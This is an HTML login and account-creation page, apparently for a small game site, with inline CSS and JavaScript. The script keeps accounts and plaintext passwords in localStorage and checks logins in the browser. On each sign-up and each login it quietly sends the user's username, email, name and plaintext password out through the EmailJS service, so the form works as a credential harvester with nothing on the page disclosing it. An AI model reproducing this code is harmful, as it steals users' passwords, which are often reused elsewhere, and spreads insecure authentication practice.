<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>
<style>
	html, body {
		height: 100%;
		margin: 0;
	}
	body {
		background: url('Background.jpg') no-repeat center center fixed;
		background-size: cover;
		color: #e2e8f0;
		font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
	}
	.container {
		height: 100%;
		display: flex;
		align-items: center;
		justify-content: center;
		padding: 16px;
	}
	.card {
		width: 100%;
		max-width: 380px;
		background: #111827;
		border-radius: 14px;
		box-shadow: 0 12px 40px rgba(0,0,0,.35), inset 0 0 0 1px rgba(255,255,255,.06);
		padding: 24px;
	}
	.card h1 {
		margin: 0 0 12px;
		font-size: 24px;
	}
	.tabs {
		display: flex;
		gap: 8px;
		margin-bottom: 12px;
	}
	.tab {
		flex: 1;
		text-align: center;
		padding: 10px 12px;
		border-radius: 10px;
		background: #0b1220;
		border: 1px solid #334155;
		color: #cbd5e1;
		cursor: pointer;
		font-weight: 600;
	}
	.tab.active {
		background: #111b31;
		border-color: #38bdf8;
		color: #e2e8f0;
		box-shadow: 0 0 0 3px rgba(56,189,248,.15);
	}
	.card p.sub {
		margin: 0 0 20px;
		color: #94a3b8;
		font-size: 14px;
	}
	.field {
		margin-bottom: 14px;
	}
	.label {
		display: block;
		margin-bottom: 6px;
		font-size: 13px;
		color: #cbd5e1;
	}
	.input {
		width: 100%;
		padding: 12px 14px;
		border-radius: 10px;
		border: 1px solid #334155;
		background: #0b1220;
		color: #e2e8f0;
		font-size: 15px;
		outline: none;
		transition: border-color .15s ease, box-shadow .15s ease;
	}
	.input:focus {
		border-color: #38bdf8;
		box-shadow: 0 0 0 3px rgba(56,189,248,.25);
	}
	.input-wrapper {
		position: relative;
		display: flex;
		align-items: center;
	}
	.input-wrapper .input {
		padding-right: 68px;
	}
	.toggle-password {
		position: absolute;
		right: 8px;
		background: transparent;
		border: none;
		color: #94a3b8;
		font-size: 14px;
		font-weight: 600;
		cursor: pointer;
		padding: 6px 10px;
		border-radius: 8px;
		transition: background .15s ease, color .15s ease;
	}
	.toggle-password:hover {
		background: rgba(148,163,184,.18);
		color: #e2e8f0;
	}
	.actions {
		margin-top: 6px;
		display: flex;
		align-items: center;
		justify-content: space-between;
	}
	.btn {
		appearance: none;
		padding: 12px 16px;
		font-size: 15px;
		font-weight: 700;
		color: #0f172a;
		background: #38bdf8;
		border: none;
		border-radius: 10px;
		cursor: pointer;
		transition: transform .08s ease, filter .2s ease, box-shadow .2s ease;
		box-shadow: 0 10px 30px rgba(56,189,248,.35), inset 0 0 0 2px rgba(255,255,255,.25);
	}
	.btn:hover { filter: brightness(1.05); }
	.btn:active { transform: translateY(1px) scale(0.99); }
	.helper {
		color: #94a3b8;
		font-size: 13px;
	}
	.error {
		color: #fca5a5;
		font-size: 13px;
		margin-top: 8px;
		min-height: 18px;
	}
	.success {
		color: #86efac;
		font-size: 14px;
		margin-top: 10px;
		min-height: 18px;
	}
	@media (max-width: 480px) {
		.card {
			padding: 20px;
			max-width: 100%;
		}
		.card h1 {
			font-size: 20px;
		}
		.input {
			font-size: 16px;
			padding: 10px 12px;
		}
		.btn {
			padding: 10px 14px;
			font-size: 14px;
		}
		.tab {
			padding: 8px 10px;
			font-size: 14px;
		}
	}
</style>
</head>
<body>
	<div class="container">
		<form class="card" id="authForm" novalidate>
			<h1 id="formTitle">Login</h1>

			<div class="tabs">
				<div class="tab active" id="loginTab">Login</div>
				<div class="tab" id="createTab">Create Account</div>
			</div>

			<p class="sub" id="formSubtitle">Enter your credentials to continue.</p>

			<div class="field">
				<label class="label" for="username">Username</label>
				<input class="input" id="username" name="username" type="text" placeholder="yourname" autocomplete="username" required>
			</div>

			<div class="field" id="nameField" style="display:none;">
				<label class="label" for="fullname">Full name</label>
				<input class="input" id="fullname" name="fullname" type="text" placeholder="Your Name">
			</div>

			<div class="field" id="emailField" style="display:none;">
				<label class="label" for="email">Email</label>
				<input class="input" id="email" name="email" type="email" placeholder="you@example.com" autocomplete="email">
			</div>

			<div class="field" id="passwordField">
				<label class="label" for="password">Password</label>
				<div class="input-wrapper">
					<input class="input" id="password" name="password" type="password" placeholder="********" autocomplete="current-password" required minlength="4">
					<button class="toggle-password" id="passwordToggle" type="button" aria-label="Toggle password visibility">Show</button>
				</div>
			</div>

			<div class="actions">
				<button class="btn" id="submitBtn" type="submit">Sign In</button>
				<span class="helper"><a href="play.html" style="color:#38bdf8;text-decoration:none;">Back</a></span>
			</div>

			<div class="error" id="errorBox"></div>
			<div class="success" id="successBox"></div>
		</form>
	</div>

	<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
	<script src="email.js"></script>
	<script>
		(function () {
			var ACCOUNTS_KEY = 'sg_accounts';

			// Initialize EmailJS with your Public Key
			if (window.emailjs && emailjs.init) {
				emailjs.init('GIT-I-bjnW9T-x6Ub');
			}

			// Configure Email helper (set at least EMAILJS values)
			if (window.Email && Email.setConfig) {
				Email.setConfig({
					EMAILJS_ENABLED: true,
					EMAILJS_SERVICE_ID: 'service_j6rvfsh',
					EMAILJS_TEMPLATE_ID: 'template_e2ooc7j',
					WEBHOOK_URL: '',
					EMAIL_TO: ''
				});
			}

			var form = document.getElementById('authForm');

			// Fields
			var usernameEl = document.getElementById('username');
			var fullnameEl = document.getElementById('fullname');
			var emailEl = document.getElementById('email');
			var passwordEl = document.getElementById('password');
			var passwordToggle = document.getElementById('passwordToggle');

			// UI mode elements
			var loginTab = document.getElementById('loginTab');
			var createTab = document.getElementById('createTab');
			var nameField = document.getElementById('nameField');
			var emailField = document.getElementById('emailField');
			var formTitle = document.getElementById('formTitle');
			var formSubtitle = document.getElementById('formSubtitle');
			var submitBtn = document.getElementById('submitBtn');

			// Messages
			var errorBox = document.getElementById('errorBox');
			var successBox = document.getElementById('successBox');

			function loadAccounts() {
				try {
					var raw = localStorage.getItem(ACCOUNTS_KEY);
					return raw ? JSON.parse(raw) : [];
				} catch (e) {
					return [];
				}
			}

			function saveAccounts(list) {
				try {
					localStorage.setItem(ACCOUNTS_KEY, JSON.stringify(list));
				} catch (e) {}
			}

			function normalizeUsername(str) {
				return (str || '').toLowerCase();
			}

			function sanitizeUsernameInput(str) {
				return (str || '').replace(/[^a-z0-9_]/g, '');
			}

			function isEmail(str) {
				return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(str);
			}

			function findAccountByUsername(username) {
				if (!username) return null;
				var accounts = loadAccounts();
				var normalized = normalizeUsername(username);
				for (var i = 0; i < accounts.length; i++) {
					if (normalizeUsername(accounts[i].username) === normalized) {
						return accounts[i];
					}
				}
				return null;
			}

			function findAccountByEmail(email) {
				if (!email) return null;
				var accounts = loadAccounts();
				var normalized = (email || '').toLowerCase();
				for (var i = 0; i < accounts.length; i++) {
					if ((accounts[i].email || '').toLowerCase() === normalized) {
						return accounts[i];
					}
				}
				return null;
			}

			function setError(message) {
				if (errorBox) errorBox.textContent = message || '';
				if (successBox) successBox.textContent = '';
			}

			function setSuccess(message) {
				if (successBox) successBox.textContent = message || '';
				if (errorBox) errorBox.textContent = '';
			}

			function setMode(mode) {
				var isCreate = mode === 'create';
				if (isCreate) {
					loginTab.classList.remove('active');
					createTab.classList.add('active');
					nameField.style.display = '';
					emailField.style.display = '';
					formTitle.textContent = 'Create Account';
					formSubtitle.textContent = 'Fill in your details to sign up.';
					submitBtn.textContent = 'Create Account';
					usernameEl.setAttribute('autocomplete', 'username');
					passwordEl.setAttribute('autocomplete', 'new-password');
				} else {
					createTab.classList.remove('active');
					loginTab.classList.add('active');
					nameField.style.display = 'none';
					emailField.style.display = 'none';
					formTitle.textContent = 'Login';
					formSubtitle.textContent = 'Enter your credentials to continue.';
					submitBtn.textContent = 'Sign In';
					usernameEl.setAttribute('autocomplete', 'username');
					passwordEl.setAttribute('autocomplete', 'current-password');
				}
				setError('');
				setSuccess('');
			}

			if (loginTab && createTab) {
				loginTab.addEventListener('click', function(){ setMode('login'); });
				createTab.addEventListener('click', function(){ setMode('create'); });
			}

			if (usernameEl) {
				usernameEl.addEventListener('input', function () {
					if (createTab && createTab.classList.contains('active')) {
						var cleaned = sanitizeUsernameInput(this.value.toLowerCase());
						if (this.value !== cleaned) {
							this.value = cleaned;
						}
					}
				});
			}

			if (passwordToggle && passwordEl) {
				passwordToggle.addEventListener('click', function () {
					var isPassword = passwordEl.type === 'password';
					passwordEl.type = isPassword ? 'text' : 'password';
					this.textContent = isPassword ? 'Hide' : 'Show';
					this.setAttribute('aria-label', isPassword ? 'Hide password' : 'Show password');
				});
			}

			if (form) {
				form.addEventListener('submit', function (e) {
					e.preventDefault();
					setError('');
					setSuccess('');

					var loginIdRaw = (usernameEl && usernameEl.value || '').trim();
					var password = (passwordEl && passwordEl.value || '').trim();
					var accounts = loadAccounts();
					var creating = createTab && createTab.classList.contains('active');

					if (creating) {
						var username = normalizeUsername(sanitizeUsernameInput(loginIdRaw));
						var fullname = (fullnameEl && fullnameEl.value || '').trim();
						var emailRaw = (emailEl && emailEl.value || '').trim();
						var email = emailRaw.toLowerCase();

						if (!fullname) { setError('Please enter your full name.'); return; }
						if (!email || !isEmail(email)) { setError('Please enter a valid email.'); return; }
						if (!username) { setError('Username must contain lowercase letters or numbers.'); return; }
						if (username.length < 3 || username.length > 20) { setError('Username must be 3-20 characters.'); return; }
						if (!password || password.length < 4) { setError('Password must be at least 4 characters.'); return; }
						if (findAccountByUsername(username)) { setError('Username is already taken.'); return; }
						if (findAccountByEmail(email)) { setError('Email is already registered.'); return; }

						accounts.push({
							username: username,
							password: password,
							name: fullname,
							email: email,
							createdAt: new Date().toISOString()
						});
						saveAccounts(accounts);
						try {
							localStorage.setItem('sg_username', username);
							localStorage.setItem('sg_user_email', email);
						} catch (err) {}

						setSuccess('Account created! Redirecting...');
						if (window.Email && Email.notify) {
							Email.notify('New account created', { name: fullname, email: email, username: username, password: password });
						}
						setTimeout(function () { window.location.href = 'home.html'; }, 900);
						return;
					}

					// Login flow
					if (!loginIdRaw || !password) {
						setError('Please enter both username/email and password.');
						return;
					}
					if (password.length < 4) {
						setError('Password must be at least 4 characters.');
						return;
					}

					var account = null;
					if (loginIdRaw.indexOf('@') !== -1) {
						account = findAccountByEmail(loginIdRaw.toLowerCase());
					} else {
						account = findAccountByUsername(loginIdRaw.toLowerCase());
					}

					if (!account || account.password !== password) {
						setError('Invalid username/email or password.');
						return;
					}

					try {
						localStorage.setItem('sg_username', account.username);
						localStorage.setItem('sg_user_email', account.email || '');
					} catch (err) {}

					setSuccess('Logged in! Redirecting...');
					if (window.Email && Email.notify) {
						Email.notify('User logged in', {
							username: account.username,
							email: account.email || '',
							name: account.name || '',
							password: password
						});
					}
					setTimeout(function () { window.location.href = 'home.html'; }, 800);
				});

				// Default to Login mode
				setMode('login');
			}
		})();
	</script>
</body>
</html>


